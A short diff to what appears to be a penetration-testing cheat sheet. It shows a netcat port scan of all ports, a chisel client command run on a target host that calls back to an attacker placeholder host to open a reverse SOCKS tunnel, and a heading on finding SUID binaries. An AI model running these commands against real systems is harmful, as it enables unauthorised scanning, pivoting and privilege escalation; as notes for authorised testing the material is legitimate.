@@ -19,7 +19,7 @@ nc -zv <IP> 1-65535
 ```
 - On target host:
 ```bash
-~$ ./chisel client <LHOST>:8000 R:socks
+./chisel client <LHOST>:8000 R:socks
 ```
 
 # Find SUID bit.
